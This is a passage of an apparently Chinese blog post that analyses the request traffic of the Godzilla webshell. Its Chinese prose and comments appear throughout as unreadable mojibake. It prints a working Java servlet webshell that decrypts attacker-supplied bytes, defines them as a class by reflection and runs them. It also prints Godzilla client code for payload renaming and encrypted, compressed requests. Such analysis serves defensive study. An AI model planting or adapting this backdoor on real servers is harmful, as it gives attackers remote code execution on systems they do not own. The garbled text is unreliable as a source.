            <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">defClass</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Method</span> defMethod <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        defMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>urlClassLoader<span class="token punctuation">,</span> classBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classBytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
                payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//ç”¨äºç¬¬ä¸€æ¬¡æ¥å—è¯·æ±‚åˆå§‹åŒ–payload</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//                Object f = payload.newInstance(); </span>
                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æœ¬åœ°åŠ è½½payloadï¼Œç”¨äºåŠ¨æ€è°ƒè¯•</span>
                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>
                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>åœ¨å“¥æ–¯æ‹‰ä¸»ç•Œé¢ï¼Œç‚¹å‡»æµ‹è¯•ä¼šåœ¨burpå‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œç„¶åå“¥æ–¯æ‹‰ä¼šå¼¹æ¡†å‡ºç°Successï¼Œè¿™æ—¶å€™å†ç‚¹å‡»ç¡®å®šï¼Œå“¥æ–¯æ‹‰ä¼šå‘èµ·ç¬¬ä¸‰æ¬¡è¯·æ±‚ï¼Œå…ˆåˆ†æè¿™ä¸‰æ¬¡è¯·æ±‚çš„æ•°æ®åŒ…ä»¥åŠå“¥æ–¯æ‹‰éƒ½åšäº†ä»€ä¹ˆäº‹æƒ…ã€‚<br><img src="/2022/05/17/godzilla/1.png"></p>
<h3 id="ç¬¬ä¸€æ¬¡è¯·æ±‚"><a href="#ç¬¬ä¸€æ¬¡è¯·æ±‚" class="headerlink" title="ç¬¬ä¸€æ¬¡è¯·æ±‚"></a>ç¬¬ä¸€æ¬¡è¯·æ±‚</h3><p>æ ¹æ®ä¸Šé¢<code>HelloServlet.java</code>æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°å“¥æ–¯æ‹‰åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä½¿ç”¨äº†AESåŠ è§£å¯†ï¼Œåœ¨æœåŠ¡ç«¯å…ˆbase64è§£ç ï¼Œç„¶åAESè§£å¯†æ•°æ®åŒ…ï¼š<br><img src="/2022/05/17/godzilla/2.png"><br>æŠŠburpçš„æ•°æ®åŒ…å¤åˆ¶ä¹‹åï¼Œæœ¬åœ°è§£å¯†çœ‹çœ‹æ˜¯ä»€ä¹ˆå†…å®¹ï¼š<br><img src="/2022/05/17/godzilla/3.png"><br>å¯ä»¥ä»å›¾é‡Œçœ‹å‡ºæ¥å¤§æ¦‚æ˜¯ä¸ªClassæ–‡ä»¶ï¼Œä¿å­˜åˆ°æœ¬åœ°ä¹‹åï¼Œåç¼–è¯‘å¯ä»¥ä¹‹åä¼šå‘ç°è¿™ä¸ªä»£ç å’Œ<code>payload.java</code>é™¤äº†ç±»åä¸åŒï¼ŒåŠŸèƒ½ä»£ç ä¸Šå®Œå…¨ä¸€æ ·ã€‚å“¥æ–¯æ‹‰å®ç°çš„è¿™éƒ¨åˆ†ä»£ç åœ¨<code>JavaShell.class</code>é‡Œé¢ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token class-name">String</span> <span class="token function">randomName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classNames <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameSet<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>classNames<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">final</span> <span class="token keyword">int</span> index <span class="token operator">=</span> functions<span class="token punctuation">.</span><span class="token function">randomInt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> classNames<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            className <span class="token operator">=</span> classNames<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameSet<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> className<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
<span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">dynamicUpdateClassName</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> protoName<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classContent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">final</span> <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>classContent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">randomName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>protoName<span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"%s ----->>>>> %s"</span><span class="token punctuation">,</span> protoName<span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>
        classContent <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> classContent<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>protoName<span class="token punctuation">,</span> protoName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> classContent<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¸»è¦åŠŸèƒ½æ˜¯åŠ¨æ€æ”¹å˜<code>payload.class</code>çš„ç±»åï¼Œä¼šä»<code>classNames.txt</code>é‡Œé¢éšæœºé€‰å–ä¸€ä¸ªåå­—ï¼š<br><img src="/2022/05/17/godzilla/4.png"><br>è¿™æ˜¯ç¬¬ä¸€ä¸ªè¯·æ±‚çš„å‘é€æµç¨‹ï¼Œåšäº†ä¸¤ä»¶äº‹ï¼š</p>
<ol>
<li>æŠŠå“¥æ–¯æ‹‰é‡Œé¢çš„<code>payload.class</code>æ›´æ–°ä¸ºéšæœºçš„ç±»åï¼Œç„¶åAESåŠ å¯†å†ç»è¿‡base64å‘é€åˆ°æœåŠ¡ç«¯çš„shell</li>
<li>æœåŠ¡ç«¯çš„shellè§£ç è§£å¯†ä¹‹åï¼Œè°ƒç”¨<code>defineClass</code>åŠ è½½åˆ°JVMï¼Œåˆå§‹åŒ–payloadå˜é‡</li>
</ol>
<p><img src="/2022/05/17/godzilla/5.png"></p>
<p>å…³äº<code>defineClass</code>çš„ç”¨æ³•ï¼Œå¯ä»¥çœ‹å®˜æ–¹çš„ä»£ç æ³¨é‡Šï¼Œè´Ÿè´£æŠŠbyte[]è½¬æ¢ä¸ºClassï¼š</p>
<blockquote>
<p>However, some classes may not originate from a file; they may originate from other sources, such as the network, or they could be constructed by an application. The method {@link #defineClass(String, byte&gt;[], int, int) defineClass} converts an array of bytes into an instance of class Class. Instances of this newly defined class can be created using {@link Class#newInstance Class.newInstance}.</p>
</blockquote>
<h3 id="ç¬¬äºŒæ¬¡è¯·æ±‚"><a href="#ç¬¬äºŒæ¬¡è¯·æ±‚" class="headerlink" title="ç¬¬äºŒæ¬¡è¯·æ±‚"></a>ç¬¬äºŒæ¬¡è¯·æ±‚</h3><p>ç¬¬äºŒæ¬¡è¯·æ±‚ï¼ŒæŒ‰ç…§åŒæ ·çš„æ–¹å¼è§£å¯†æ•°æ®åŒ…ï¼Œä¼šå‘ç°å‡ºæ¥çš„æ˜¯ä¸€å †ä¹±ç ï¼š<br><img src="/2022/05/17/godzilla/6.png"><br>ä¸è¦æ…Œï¼Œå…ˆä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åé‡å‘½åä¸ºgzæ–‡ä»¶ï¼Œå†ä½¿ç”¨gunzipè§£å‹ä¹‹åæŸ¥çœ‹æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æ˜¯<code>methodNametest</code><br>åœ¨å“¥æ–¯æ‹‰æºä»£ç é‡Œé¢ï¼Œå¯ä»¥æ‰£å‡ºæ¥ç›¸å…³å®ç°:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReqParameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">evalFunc</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">final</span> <span class="token class-name">String</span> codeString <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>codeString<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>isAlive <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>codeString<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fillParameter</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> funcName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>className <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> className<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        parameter<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"evalClassName"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    parameter<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"methodName"</span><span class="token punctuation">,</span> funcName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">evalFunc</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> funcName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fillParameter</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> funcName<span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç»„è£…å‚æ•°methodNametest</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> parameter<span class="token punctuation">.</span><span class="token function">formatEx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    data <span class="token operator">=</span> functions<span class="token punctuation">.</span><span class="token function">gzipE</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//gzipå‹ç¼©åŠ å¯†</span>
    <span class="token keyword">return</span> functions<span class="token punctuation">.</span><span class="token function">gzipD</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">sendHttpResponse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å‘é€è¯·æ±‚ä¹‹åæ¥æ”¶æ•°æ®ï¼Œç„¶åè§£å¯†è§£å‹ç¼©</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å“¥æ–¯æ‹‰å®¢æˆ·ç«¯çš„æµç¨‹ï¼šå…ˆåœ¨æœ¬åœ°ç»„è£…æœ¬æ¬¡è¯·æ±‚çš„å‚æ•°ï¼Œå‹ç¼©ä¹‹ååŠ å¯†å‘é€åˆ°æœåŠ¡ç«¯ã€‚</p>
<p>æ­¤æ—¶åœ¨æ‰“ä¸ªæ–­ç‚¹åšä¸€æ¬¡è°ƒè¯•çœ‹çœ‹ï¼š<br><img src="/2022/05/17/godzilla/8.png"></p>
<h4 id="f-equals-arrOut"><a href="#f-equals-arrOut" class="headerlink" title="f.equals(arrOut)"></a><code>f.equals(arrOut)</code></h4><p>ç¬¬ä¸€æ¬¡è¿›å…¥åˆ°payloadçš„equalså‡½æ•°ï¼ŒarrOutæ˜¯<code>ByteArrayOutputStream</code>å˜é‡ï¼Œä¼ é€’ç»™<code>this.outputStream</code>ï¼Œåˆå§‹åŒ–ä¸€ä¸ªè¾“å‡ºå¯¹è±¡ï¼Œç”¨äºè·å–payloadæ‰§è¡Œç»“æœï¼Œæœ€ç»ˆè¿”å›ç»™å®¢æˆ·ç«¯ã€‚<br><img src="/2022/05/17/godzilla/10.png"></p>
<h4 id="f-equals-data"><a href="#f-equals-data" class="headerlink" title="f.equals(data)"></a><code>f.equals(data)</code></h4><p>dataæ˜¯å“¥æ–¯æ‹‰å®¢æˆ·ç«¯ä¼ é€’ç»™æœåŠ¡ç«¯çš„æ•°æ®ï¼ŒæœåŠ¡ç«¯å…ˆè¿›è¡Œè§£å¯†ï¼Œç„¶åè¿›å…¥<code>f.equals(data)</code>å‡½æ•°ï¼Œç„¶åè¿›å…¥<code>handle()</code>å‡½æ•°è¿›è¡Œå˜é‡åˆå§‹åŒ–æ“ä½œï¼š<br><img src="/2022/05/17/godzilla/11.png"><br>ä¸Šè¿°æ“ä½œå®Œæˆä¹‹åï¼Œè¿›å…¥<code>this.formatParameter()</code>å‡½æ•°ï¼Œå¯¹ä¸Šä¸€æ­¥è·å–åˆ°çš„<code>this.requestData</code>è§£å‹ç¼©ä¹‹åå¾ªç¯åˆ¤æ–­å“¥æ–¯æ‹‰ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼Œæœ€åæ”¾åˆ°<code>this.paramterMap</code>:<br><img src="/2022/05/17/godzilla/12.png"></p>
<p>ç¬¬äºŒæ¬¡çš„<code>equals</code>å®Œæˆäº†å¯¹å“¥æ–¯æ‹‰ä¼ é€’è¿‡æ¥æ•°æ®çš„åˆå§‹åŒ–ï¼Œæœ€ç»ˆæ”¾åˆ°<code>this.paramterMap</code>ä¿å­˜ã€‚</p>
<h4 id="f-equals-req"><a href="#f-equals-req" class="headerlink" title="f.equals(req)"></a><code>f.equals(req)</code></h4><p><img src="/2022/05/17/godzilla/9.png"><br>ç¬¬ä¸‰æ¬¡equalsçš„æ—¶å€™æ‰§è¡Œ<code>f.equals(req)</code>ï¼Œè¿›å…¥åˆ°<code>handle()</code>å‡½æ•°ï¼Œå¡«å……<code>this.servletRequest</code>å¯¹è±¡ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">supportClass</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"%s.servlet.http.HttpServletRequest"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>servletRequest <span class="token operator">=</span> obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">supportClass</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"%s.servlet.ServletRequest"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>servletRequest <span class="token operator">=</span> obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åè¿›å…¥<code>this.handlePayloadContext()</code>åˆ©ç”¨<code>payload.class</code>é‡Œé¢å®šä¹‰å¥½çš„åå°„å‡½æ•°ï¼Œè·å–<code>servletRequest</code>, <code>servletContext</code>, <code>httpSession</code>å¯¹è±¡ï¼Œç„¶åå¡«å……ç»™payloadå˜é‡ï¼š<br><code>this.servletRequest</code>ã€<code>this.servletContext</code>ã€<code>this.httpSession</code>ã€‚</p>
